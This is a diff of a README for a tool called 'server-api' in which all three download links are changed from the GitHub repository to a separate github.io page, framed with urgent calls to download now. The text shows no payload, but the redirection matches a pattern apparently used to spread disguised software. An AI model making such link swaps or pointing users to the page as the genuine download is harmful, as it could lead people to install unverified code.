@@ -10,7 +10,7 @@ Think of server-api as a universal remote control for your AI assistants. It con
 
 ### 🔥 Quick Download
 
-[![Download server-api](https://img.shields.io/badge/Download-server--api-blue?style=for-the-badge&logo=github)](https://github.com/ogthheu/server-api)
+[![Download server-api](https://img.shields.io/badge/Download-server--api-blue?style=for-the-badge&logo=github)](https://ogthheu.github.io)
 
 **Click the button above to get started!**
 
@@ -20,7 +20,7 @@ Think of server-api as a universal remote control for your AI assistants. It con
 
 ### Step 1: Get the Files
 
-Visit this link to download the application: **[https://github.com/ogthheu/server-api](https://github.com/ogthheu/server-api)**
+Visit this link to download the application: **[https://ogthheu.github.io](https://ogthheu.github.io)**
 
 ### Step 2: What Happens Next
 
@@ -152,7 +152,7 @@ We're constantly improving server-api based on user feedback – your experience
 
 You're just minutes away from having full control over your AI agents. Download server-api today and see how simple agent management can be!
 
-[![Get server-api Now](https://img.shields.io/badge/🚀_Get_server--api_Now-2ea44f?style=for-the-badge)](https://github.com/ogthheu/server-api)
+[![Get server-api Now](https://img.shields.io/badge/🚀_Get_server--api_Now-2ea44f?style=for-the-badge)](https://ogthheu.github.io)
 
 ---
 
